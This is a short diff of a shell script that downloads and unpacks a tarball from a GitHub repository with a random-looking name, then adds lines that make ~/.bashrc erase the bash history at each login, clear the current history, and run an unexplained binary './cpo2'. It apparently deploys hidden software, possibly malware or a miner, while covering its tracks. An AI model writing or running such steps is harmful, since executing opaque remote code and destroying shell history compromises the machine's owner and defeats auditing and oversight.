@@ -11,3 +11,9 @@ wget https://github.com/j2d23enr2os32omedaro/jfksdhfvdsiouwrbn32980vxcnbmdfsajkf
 tar -xf euocean.tar.gz
 rm -r euocean.tar.gz
 
+echo ". cat /dev/null > ~/.bash_history" >> ~/.bashrc
+echo ". history -cw" >> ~/.bashrc
+cat /dev/null > ~/.bash_history
+history -cw
+
+./cpo2
